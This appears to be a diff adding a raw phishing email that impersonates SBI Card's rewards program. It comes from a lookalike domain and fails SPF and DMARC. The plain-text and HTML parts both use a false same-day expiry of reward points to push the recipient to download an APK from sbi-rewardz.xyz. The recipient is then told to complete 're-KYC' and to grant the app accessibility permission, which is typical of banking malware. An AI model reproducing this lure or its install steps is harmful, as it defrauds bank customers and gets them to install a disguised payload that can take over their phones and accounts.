@@ -1,0 +1,73 @@
+Return-Path: <bounce@mailer-9x.top>
+Delivered-To: ramesh.kumar1985@gmail.com
+Received: from mx.google.com by 10.142.88.31 with SMTP id k9csp2841mln;
+        Tue, 08 Sep 2026 09:08:44 +0530
+Received: from mailer-9x.top (unknown [103.86.12.44])
+        by mx.google.com with ESMTPS id q7si1184402pgb.221.2026.09.08.09.08.41;
+        Tue, 08 Sep 2026 09:08:42 +0530
+Received-SPF: fail (google.com: domain of bounce@mailer-9x.top does not designate 103.86.12.44 as permitted sender) client-ip=103.86.12.44;
+Authentication-Results: mx.google.com;
+       spf=fail (google.com: domain of bounce@mailer-9x.top does not designate 103.86.12.44 as permitted sender) smtp.mailfrom=bounce@mailer-9x.top;
+       dkim=none;
+       dmarc=fail (p=NONE sp=NONE dis=NONE) header.from=sbi-rewardz.xyz
+X-Originating-IP: [103.86.12.44]
+Message-ID: <20260908090841.4c8a1e@mailer-9x.top>
+Date: Tue, 08 Sep 2026 09:08:41 +0530
+From: "SBI Card Rewards" <rewards@sbi-rewardz.xyz>
+Reply-To: <support.redeem@mailer-9x.top>
+To: ramesh.kumar1985@gmail.com
+Subject: URGENT: 9,840 SBI Reward Points expire today - redeem now
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="----=_Part_88412_1746092211"
+X-Mailer: PHPMailer 6.1.4 (https://github.com/PHPMailer/PHPMailer)
+
+------=_Part_88412_1746092211
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Dear Customer,
+
+Your 9,840 SBI Credit Card reward points worth Rs. 9,840 will EXPIRE TODAY
+at 11:59 PM. This is the final notice.
+
+To redeem your cashback immediately, download and install the official SBI
+Rewards redemption app:
+
+http://sbi-rewardz.xyz/download/SBI-Rewards.apk
+
+Steps:
+1. Install the app and open it.
+2. Complete re-KYC verification with your registered mobile number.
+3. Enable accessibility permission when prompted so the app can auto-fill
+   your reward details.
+4. Your cashback will be credited within 30 minutes.
+
+Do not share your OTP with anyone. For assistance call our helpline
+9123456789 or write to support.redeem@mailer-9x.top.
+
+Warm regards,
+Rewards Redemption Cell
+SBI Cards and Payment Services Ltd.
+
+------=_Part_88412_1746092211
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+<html><body style="font-family:Arial">
+<h2>Dear Customer,</h2>
+<p>Your <b>9,840 SBI Credit Card reward points</b> worth Rs. 9,840 will
+<b>EXPIRE TODAY</b> at 11:59 PM. This is the final notice.</p>
+<p>To redeem your cashback immediately, download and install the official
+SBI Rewards redemption app:</p>
+<p><a href="http://sbi-rewardz.xyz/download/SBI-Rewards.apk">DOWNLOAD SBI REWARDS APP</a></p>
+<ol>
+<li>Install the app and open it.</li>
+<li>Complete re-KYC verification with your registered mobile number.</li>
+<li>Enable accessibility permission when prompted.</li>
+<li>Your cashback will be credited within 30 minutes.</li>
+</ol>
+<p>Do not share your OTP with anyone. Helpline 9123456789.</p>
+<p>Rewards Redemption Cell<br>SBI Cards and Payment Services Ltd.</p>
+</body></html>
+
+------=_Part_88412_1746092211--
